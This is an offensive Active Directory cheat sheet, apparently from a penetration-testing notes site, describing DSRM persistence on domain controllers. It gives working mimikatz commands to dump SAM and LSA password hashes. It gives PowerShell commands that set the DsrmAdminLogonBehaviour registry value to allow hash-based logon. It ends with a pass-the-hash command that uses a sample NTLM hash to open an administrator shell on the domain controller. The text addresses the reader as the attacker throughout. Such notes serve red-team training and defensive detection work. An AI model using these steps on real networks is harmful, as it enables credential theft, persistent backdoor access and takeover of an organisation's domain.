# DSRM

All domain controllers have a hard-coded local Administrator account stored in their SAM file. This account and local database are not used or generally available when the domain controllers are running normally.

While Active Directory Domain Controller is configured, the wizard prompts ask to enter a DSRM password for the local administrator. This password provides the administrator with a back door to the database in case something goes wrong later.

**DSRM persistence is possible where the systems do not change the DSRM password after AD installation or do not follow the standard of changing passwords regularly for DSRM.**

### <mark style="color:orange;">Extract the Hash</mark>

All you need to do is just run the mimikatz with Administration privilege and execute these commands given below:

```
privilege::debug
token::elevate
```

Extract local Administrator Password Hash

```
lsadump::sam
```

Extract AD Administrator Password Hash

```
lsadump::lsa /patch
```

### <mark style="color:orange;">Change the DSRM Registry Key Value</mark>

Once you have the local administrator password hash you need to make some changes inside the Windows registry that will allow you (attacker) to login into Domain Controller using DSRM hashes without rebooting the server.

Very first confirm the registry key value for DsrmAdminLogonBehaviour with the help of the following command:

```
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
```

{% hint style="info" %}
If DsrmAdminLogonBehaviou registry key is not present inside the HKLM:\System\CurrentControlSet\Control\Lsa\ then create a new key and set the value with the help of the following command:
{% endhint %}

```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
```

#### the `DsrmAdminLogonBehaviour Value=0` will not allow login into DC using DSRM hash.

Set DsrmAdminLogonBehaviour value=2 with the help of the following command:

```
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

### <mark style="color:orange;">Pass the DSRM Hash</mark>

#### <mark style="color:green;">At Client System</mark>

To access the domain controller CMD through the client system, run mimikatz with administrator privilege and execute the following command:

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38
```

Use the hash value of the local Administrator in the above command

This will provide you (attacker) the Administrator privilege cmd shell of the Domain controller
